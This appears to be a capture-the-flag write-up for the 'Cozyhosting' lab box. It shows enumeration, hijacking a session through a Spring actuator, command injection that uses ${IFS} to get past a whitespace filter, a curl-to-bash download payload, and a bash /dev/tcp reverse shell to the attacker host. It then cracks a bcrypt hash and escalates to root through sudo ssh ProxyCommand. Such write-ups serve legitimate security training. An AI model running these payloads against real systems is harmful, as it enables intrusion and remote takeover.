Cozyhosting

Cozyhosting is an "Easy" unix box.

Enumeration & Fingerprinting

The first step has been to enumerate active ports and associated services.

Enumerate all opened (TCP) ports:

> nmap -sV -sC -oN cozy-hosting.nmap 10.10.11.230

...
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)

Only ports 22 and 80 are open; the "cozyhosting.htb" domain is added to /etc/hosts.

The site appears offering some cloud hosting services. Apart from the login, there's nothing of interest.

Various tests are performed on the login: - SQLi - NoSQLi - Command Injection But none of these attacks seems to work.

Some directory brute forcing is performed:

Performing a more accurate fingerprinting, it's relevated that the application running behind nginx is a Java application; this is deductable from two aspects:

  • The login page sets a JSESSIONID cookie, typical of java servelets or spring(boot) applications.
  • The error page is one of those typical of Spring

With that information, a more technology-related directory brute forcing is performed:

This confirms that the application is made with Spring, (see Spring Actuators). Sessions actuator gives the actual active sessions, leaking that of a legitm logged user:

Overriding the current JSESSIONSID cookie in the browser with the "kanderson" cookie, it's possible to access to the admin panel. From this panel, the Cozy Cloud administrator is supposed to monitor and automate security testing on some hosts.

RCE

From the automating patch form is possible to provide an host and an username to use when trying performing an ssh connection; actually, no ssh connection is really initiated.

Instead, a command injection vulnerability affects the username field:

A little bypass is needed since there's a validation preventing the username containing whitespaces, confirmed by the message returned from the response in the Location header:

Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!

To circumvent this problem, the Internal Field Separator (IFS) environment variable is abused; this variable determines how Bash recognizes word boundaries while splitting a sequence of character strings. The default value of IFS is a three-character string comprising a space, tab, and newline.

The final payload is the following:

$(curl${IFS}-s${IFS}http://10.10.14.26:8000/cmd|bash)

The commands pipes the response from the remote http server to a bash shell; the /cmd response returns the following command, opening a reverse web shell:

bash -i >& /dev/tcp/10.10.14.26/8090 0>&1

The user running the application is "app".

Privilege Escalation

After upgrading the shell to a full pty shell, database credentials are leaked from the jar containing the whole web application, located at /app path:

> unzip -l cloudhosting-0.0.1.jar ...
551 2023-08-10 23:22 BOOT-INF/classes/application.properties
...

> unzip -p cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties
server.address=127.0.0.1 server.servlet.session.timeout=5m management.endpoints.web.exposure.include=health,beans,env,sessions,mappings management.endpoint.sessions.enabled = true spring.datasource.driver-class-name=org.postgresql.Driver spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect spring.jpa.hibernate.ddl-auto=none spring.jpa.database=POSTGRESQL spring.datasource.platform=postgres spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting spring.datasource.username=postgres spring.datasource.password=Vg&nvzAQ7XxR

Accessing PostgreSQL console with psql:

> psql -U postgres -h localhost cozyhosting

The result of the query is the following:

name password role

The hashcat mode to use in order to crack the hash with hascat is the 3200 (blowfish):

> echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' | hashid -m
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]

The hash is then cracked:

> hashcat -m 3200 hashes.txt /usr/share/dict/rockyou.txt ...
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited

This password is used to logon as josh. Josh appears to have sudo privileges:

From GTFObins, it appears that is possible to abuse ssh with sudo privileges to open a root shell session with the following command:

> sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
